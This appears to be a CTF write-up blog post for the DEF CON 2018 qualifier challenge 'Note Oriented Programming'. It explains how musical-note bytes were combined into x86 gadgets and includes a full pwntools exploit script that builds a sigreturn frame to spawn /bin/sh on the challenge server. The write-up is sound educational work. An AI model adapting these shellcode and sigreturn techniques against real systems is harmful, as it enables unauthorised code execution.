---
title: Note Oriented Programming - DEF CON CTF Qualifier 2018
layout: post
date: '2018-05-21 21:00:00'
---

> [nop](/assets/defcon18/nop)

*145 points, 29 Solves, pwn/shellcode*


We are given a binary that reads up to 2000 frequencies as shorts into a fixed mapping at `0x40404000`.

These were then convert to the musical note equivilent and copied to `0x60606000`, along with a short prelude and int 0x80 appened to create the final shellcode.

So we have to create our shellcode using only `A0`, `A#0`, `B1`, etc. We can also send a frequency of `0xffff` followed by any arbitrary data and it will be copied to the `0x40404000` region but be skipped when converting to the notes, allowing us to put data at a know location. 

Looking at the combinations of notes and the gadgets they produce, we have a lot of xor,inc but no way to set ecx for a execve syscall.

This left either self self-modifying code, or `sigreturn` to execve as we could setup the stack and store `/bin/sh` in the `0x40404000` region.

In the prelude, edi and esi were setup to point to the stack, which was prefilled filled with `O` along with a message `---- Welcome to Note Oriented Programming!! ----` and the other registers set to `0`.

Some useful gadgets found after combining some off the notes are:

```haskell
D6 - inc esp; ss
F6 - inc esi; ss
G6 - inc edi; ss

A3F4 - inc ecx; xor eax,DWORD PTR [esi+0x34]
A1F4 - inc ecx; xor DWORD PTR [esi+0x34],eax
A3G0 - inc ecx; xor eax,DWORD PTR [edi+0x30]

B5A9B9 - inc edx; xor eax,0x39423941
B5F9B9 - inc edx; xor eax,0x39423946
```

I decided to go with the `sigreturn` method as we could easily xor the stack to 0 and then set it to the required value with a few more xors. The stack needed to look like the following:

```python
0x00000063      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x40404747      0x00000000      0x00000000      0x0000000b
0x00000000      0x00000000      0x60606666      0x00000023
0x00000000      0x00000000      0x0000002b      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
``` 

Then set `eax` to `0x77` for `sigreturn`, `/bin/sh` at `0x40404747` and pad the payload so that `int 0x80` lands at `0x60606666`. After a lot of messing about xoring values we finally end up with the flag!

`OOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}`


```python
#!/usr/bin/env python2

from pwn import *
from note_lookup import *
from pow import *

def set_esi_40404747(notes):
  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]

  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["B5", "B9", "B9"] # inc edx; xor eax,0x39423942
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944
  notes += ["A4", "F6"] # inc ecx; xor al,0x46; ss

  notes += ["B5", "A9", "B9"] # inc edx; xor eax,0x39423941
  notes += ["B5", "F9", "B9"] # inc edx; xor eax,0x39423946
  notes += ["A1", "F4", "F6"] * 2 # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss

  notes += ["B5", "A9", "B9"] # inc edx; xor eax,0x39423941
  notes += ["B5", "F9", "B9"] # inc edx; xor eax,0x39423946
  notes += ["A1", "F4", "F6"] * 2 # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss


  notes += ["A3", "F4"] # inc ecx; xor eax,DWORD PTR [esi+0x34]
  notes += ["B5", "B9", "B9"] # inc edx; xor eax,0x39423942
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944
  notes += ["A4", "F6"] # inc ecx; xor al,0x46; ss

def set_esi_00000b(notes):
  notes += ["A2", "G0"] # inc ecx; xor al,BYTE PTR [edi+0x39]
  notes += ["A4", "D6"] # inc ecx; xor al,0x44; ss

  notes += ["A1", "F4", "F6", "F6", "F6", "F6"] # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss

  notes += ["A2", "G0"] # inc ecx; xor al,BYTE PTR [edi+0x39]
  notes += ["A4", "D6"] # inc ecx; xor al,0x44; ss



def set_esi_60606666(notes):
  notes += ["A2", "G8"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["A4", "A6"] # inc ecx; xor al,0x41; ss

  notes += ["B5", "C9", "B9"] # inc edx; xor eax,0x39423943
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944

  notes += ["A1", "F4", "F6"] * 2 # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss


  notes += ["B5", "B9", "B9"] # inc edx; xor eax,0x39423942
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944

  notes += ["A1", "F4", "F6"] * 2 # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss

  notes += ["A4", "A6"] # inc ecx; xor al,0x41; ss
  notes += ["A2", "G8"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["B5", "C9", "B9"] # inc edx; xor eax,0x39423943
  notes += ["B5", "B9", "B9"] # inc edx; xor eax,0x39423942

def set_esi_23(notes):
  notes += ["A2", "G8"] # inc ecx; xor al,BYTE PTR [edi+0x38]


  notes += ["B5", "F9", "B9"] # inc edx; xor eax,0x39423946
  notes += ["B5", "E9", "B9"] # inc edx; xor eax,0x39423945


  notes += ["A1", "F4", "F6", "F6", "F6", "F6"] # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss

  notes += ["A2", "G8"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["B5", "F9", "B9"] # inc edx; xor eax,0x39423946
  notes += ["B5", "E9", "B9"] # inc edx; xor eax,0x39423945


def set_esi_2b(notes):
  notes += ["A2", "G9"] # inc ecx; xor al,BYTE PTR [edi+0x39]
  notes += ["A2", "G9"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["A2", "G7"] # inc ecx; xor al,BYTE PTR [edi+0x37]
  notes += ["B5", "B9", "B9"] # inc edx; xor eax,0x39423942
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944

  notes += ["A1", "F4", "F6", "F6", "F6", "F6"] # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss

  notes += ["A2", "G9"] # inc ecx; xor al,BYTE PTR [edi+0x39]
  notes += ["A2", "G9"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["A2", "G7"] # inc ecx; xor al,BYTE PTR [edi+0x37]
  notes += ["B5", "B9", "B9"] # inc edx; xor eax,0x39423942
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944


def set_esi_63(notes):
  notes += ["A2", "G8"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["A4", "A6"] # inc ecx; xor al,0x41; ss

  notes += ["B5", "F9", "B9"] # inc edx; xor eax,0x39423946
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944

  notes += ["A1", "F4", "F6", "F6", "F6", "F6"] # inc ecx; xor DWORD PTR [esi+0x34],eax;  inc esi; ss

  notes += ["B5", "F9", "B9"] # inc edx; xor eax,0x39423946
  notes += ["B5", "D9", "B9"] # inc edx; xor eax,0x39423944

  notes += ["A2", "G8"] # inc ecx; xor al,BYTE PTR [edi+0x38]
  notes += ["A4", "A6"] # inc ecx; xor al,0x41; ss


"""
Target stack
0x00000063      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x40404747      0x00000000      0x00000000      0x0000000b
0x00000000      0x00000000      0x60606666      0x00000023
0x00000000      0x00000000      0x0000002b      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000

"""

def exploit():   
  notes = []

  # move stack past the welcome message setup edi so we can xor
  notes += ["D6", "D6"] * 58 # inc esp; ss inc esp; ss
  notes += ["F6", "F6"] * 32 # inc esi; ss inc esi; ss
  notes += ["G6", "G6"] * 6 # inc edi; ss inc edi; ss


  # setup stack for sigreturn
  # gs
  notes += ["A3", "F4"] # inc ecx; xor eax,DWORD PTR [esi+0x34]
  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  set_esi_63(notes)
  # notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]


  # stack for nulls
  notes += ["A3", "F4"] # inc ecx; xor eax,DWORD PTR [esi+0x34]
  for x in range(7):
    notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
    notes += ["F6", "F6"]*2 # inc esi; ss inc esi; ss

  # stack for ebx to /bin/sh
  set_esi_40404747(notes)

  # set nulls
  for x in range(2):
    notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
    notes += ["F6", "F6"]*2 # inc esi; ss inc esi; ss

  # stack for eax to 0xb
  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  set_esi_00000b(notes)


  # stack for nulls
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  for x in range(2):
    notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
    notes += ["F6", "F6"]*2 # inc esi; ss inc esi; ss


  # stack for eip to int 0x80
  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  set_esi_60606666(notes)
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]

  # stack for cs
  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  set_esi_23(notes)

  # stack for nulls
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  for x in range(2):
    notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
    notes += ["F6", "F6"]*2 # inc esi; ss inc esi; ss
  # notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]

  # stack for ss
  notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]
  set_esi_2b(notes)
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]

  # stack for nulls
  for x in range(5):
    notes += ["A1", "F4"] # inc ecx; xor DWORD PTR [esi+0x34],eax
    notes += ["F6", "F6"]*2 # inc esi; ss inc esi; ss
  notes += ["A3", "G0"] # inc ecx; xor eax,DWORD PTR [edi+0x30]

  # set eax to 0x77 for sigreturn syscall
  notes += ["B5", "A9", "B9"] # inc edx; xor eax,0x39423941
  notes += ["B5", "B9", "B9"]  # inc edx; xor eax,0x39423942
  notes += ["G6", "G6"] * 4 # inc edi; ss inc edi; ss
  notes += ["A2", "G9"] # inc ecx; xor al,BYTE PTR [edi+0x39]

  payload = ""
  for n in notes:

    payload += note_lookup[n]

  # convert notes to frequency and pad so int 0x80 is at the right offset
  payload = payload + note_lookup["A6"]*((0x652-len(payload))/2)

  # append /bin/sh to be at a known location
  payload += p16(0xffff) + "\x01\x01\x01" + "/bin/sh\x00"*40
  p.sendline(payload + p16(0))
  p.interactive()

  # cat flag
  # OOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}

if __name__ == "__main__":
  name = "./nop"
  binary = ELF(name)

  context.terminal=["tmux", "sp", "-h"]
  context.arch = "i386"

  if len(sys.argv) > 1:
    p = remote("4e6b5b46.quals2018.oooverflow.io", 31337)
    do_pow(p)

  else:
    p = process([name], env={})
    gdb.attach(p, """
    c
    """)

  exploit()
```